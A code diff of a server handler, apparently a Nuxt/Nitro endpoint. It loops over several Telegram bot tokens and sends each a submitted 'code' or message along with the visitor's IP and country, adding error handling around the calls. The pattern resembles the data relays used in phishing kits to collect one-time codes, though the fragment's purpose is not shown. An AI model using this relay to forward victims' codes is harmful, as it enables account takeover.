@@ -14,48 +14,53 @@ export default defineEventHandler(async (event) => {
       })
     }
 
-//     await $fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-//       method: 'POST',
-//       body: {
-//         chat_id: process.env.TELEGRAM_CHAT_ID,
-//         text: code
-//           ? `
-//           <b>Code:</b> ${code}
-// <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-// <b>Country:</b>${countryCode}
-//           `
-//           : `
-//           <b>${message}</b>
-// <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-// <b>Country:</b>${countryCode}
-//           `,
-//         parse_mode: 'HTML',
-//       },
-//     })
-//     return 'ok'
+    //     await $fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    //       method: 'POST',
+    //       body: {
+    //         chat_id: process.env.TELEGRAM_CHAT_ID,
+    //         text: code
+    //           ? `
+    //           <b>Code:</b> ${code}
+    // <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
+    // <b>Country:</b>${countryCode}
+    //           `
+    //           : `
+    //           <b>${message}</b>
+    // <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
+    // <b>Country:</b>${countryCode}
+    //           `,
+    //         parse_mode: 'HTML',
+    //       },
+    //     })
+    //     return 'ok'
 
     for (let i = 0; i < tokens.length; i++) {
       if (!tokens[i] || !chatIds[i]) {
         continue
       }
-      await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
-        method: 'POST',
-        body: {
-          chat_id: chatIds[i],
-          text: code
-            ? `
+      try {
+        await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
+          method: 'POST',
+          body: {
+            chat_id: chatIds[i],
+            text: code
+              ? `
             <b>Code:</b> ${code}
 <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
 <b>Country:</b>${countryCode}
             `
-            : `
+              : `
             <b>${message}</b>
 <b>ip:</b>${event.headers.get('CF-Connecting-IP')}
 <b>Country:</b>${countryCode}
             `,
-          parse_mode: 'HTML',
-        },
-      })
+            parse_mode: 'HTML',
+          },
+        })
+      } catch (error) {
+        // return error
+        console.error(error)
+      }
     }
     return 'ok'
   } catch (error) {
